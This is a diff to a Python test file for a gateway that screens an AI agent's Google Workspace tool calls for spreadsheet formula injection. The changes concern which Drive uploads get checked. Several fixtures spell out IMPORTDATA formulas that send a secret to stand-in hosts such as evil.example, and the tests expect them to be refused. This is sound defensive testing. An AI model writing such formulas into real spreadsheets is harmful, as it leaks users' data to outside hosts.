@@ -346,8 +346,6 @@ _FORMULA = "=IMPORTDATA(\"https://evil.example/?q=SECRET\")"
     # a native Sheet rewritten from CSV through Drive — no "sheet" in the name
     ("google_workspace__update_drive_file",
      {"file_id": "1sheet", "mime_type": "text/csv", "content": _FORMULA}),
-    ("google_workspace__create_drive_file",
-     {"file_name": "x.csv", "content": "h\n" + _FORMULA, "content_mime_type": "text/csv"}),
     # no "=" at all
     ("google_workspace__modify_sheet_values",
      {"spreadsheet_id": "s", "range_name": "A1", "values": [["+IMPORTDATA(\"https://evil.example\")"]]}),
@@ -441,8 +439,6 @@ def test_json_string_requests_with_image_url_refused() -> None:
     ("google_workspace__import_to_google_sheets", {"file_name": "x.xlsx"}),
     ("google_workspace__create_drive_file",
      {"file_name": "x.xlsx", "mime_type": "application/vnd.google-apps.spreadsheet"}),
-    ("google_workspace__create_drive_file",
-     {"file_name": "x.csv", "content_mime_type": "text/csv"}),
 ])
 def test_binary_upload_that_becomes_a_sheet_refused(tool: str, extra: dict[str, Any]) -> None:
     """Whatever it holds: an XLSX hides formulas behind zip members, XML
@@ -456,7 +452,7 @@ def test_binary_upload_that_becomes_a_sheet_refused(tool: str, extra: dict[str, 
 
 
 def test_binary_uploads_that_do_not_become_a_sheet_pass() -> None:
-    """A PNG to Drive, a DOCX to Docs: not cells, not scanned, not refused."""
+    """A PNG or an .xlsx to Drive, a DOCX to Docs: not cells, not scanned, not refused."""
     gateway, session_call = _make_gateway()
     png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(range(256))).decode()
     _call(gateway, "google_workspace__create_drive_file",
@@ -467,7 +463,15 @@ def test_binary_uploads_that_do_not_become_a_sheet_pass() -> None:
           {"file_name": "x.xlsx", "file_path": "/data/attachments/x.xlsx"})
     _call(gateway, "google_workspace__import_to_google_doc",
           {"file_name": "x.docx", "base64_content": base64.b64encode(bytes(range(256))).decode()})
-    assert session_call.await_count == 4
+    # An Excel or CSV file saved to Drive stays that file: Drive doesn't
+    # convert it, so Google never evaluates its formulas.
+    _call(gateway, "google_workspace__create_drive_file",
+          {"file_name": "q3.xlsx", "base64_content": _xlsx("SUM(A1:A9)"),
+           "content_mime_type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"})
+    _call(gateway, "google_workspace__create_drive_file",
+          {"file_name": "x.csv", "content_mime_type": "text/csv",
+           "base64_content": base64.b64encode(b"name,total\nacme,42\n").decode()})
+    assert session_call.await_count == 6
 
 
 def test_csv_text_content_to_a_sheet_passes() -> None:
@@ -611,3 +615,42 @@ def test_formula_scan_is_linear_on_many_unclosed_openers() -> None:
     _call(gateway, "google_workspace__import_to_google_sheets", {"file_name": "x.csv", "content": text})
     assert time.perf_counter() - t0 < 5
     assert session_call.await_count == 1
+
+
+def test_drive_files_that_stay_files_are_not_formula_checked() -> None:
+    """A note or Markdown file created in Drive is stored as text, never
+    evaluated, so "Logo image (PNG)" in it is not a formula."""
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__create_drive_file",
+          {"file_name": "notes.md", "content": "Logo image (PNG) attached.\nSee image (attached)."})
+    _call(gateway, "google_workspace__create_drive_file",
+          {"file_name": "notes.txt", "mime_type": "text/plain", "content": "=IMAGE(\"https://x.test/a.png\")"})
+    assert session_call.await_count == 2
+
+
+def test_drive_update_with_any_stated_type_is_still_checked() -> None:
+    """The file being rewritten may be a native Sheet, and Drive converts
+    plain text and TSV into it too, so a stated non-spreadsheet type on an
+    update does not skip the check."""
+    gateway, session_call = _make_gateway()
+    for mime in ("text/plain", "text/markdown", "text/tab-separated-values", "application/pdf"):
+        result = _call(gateway, "google_workspace__update_drive_file",
+                       {"file_id": "1sheet", "mime_type": mime,
+                        "content": '=IMPORTDATA("https://x.test/leak")'})
+        assert json.loads(result)["error"], mime
+        result = _call(gateway, "google_workspace__update_drive_file",
+                       {"file_id": "1sheet", "content_mime_type": mime,
+                        "base64_content": base64.b64encode(b"a\tb").decode()})
+        assert "cannot be checked" in json.loads(result)["error"], mime
+    assert session_call.await_count == 0
+
+
+def test_drive_update_with_spreadsheet_bytes_still_refused() -> None:
+    """The file being replaced may be a native Sheet, which would convert
+    these bytes; a binary of unknown type counts too."""
+    gateway, session_call = _make_gateway()
+    for extra in ({"content_mime_type": "text/csv"}, {}):
+        result = _call(gateway, "google_workspace__update_drive_file",
+                       {"file_id": "1sheet", **extra, "base64_content": _xlsx("SUM(A1:A9)")})
+        assert "cannot be checked" in json.loads(result)["error"]
+    assert session_call.await_count == 0
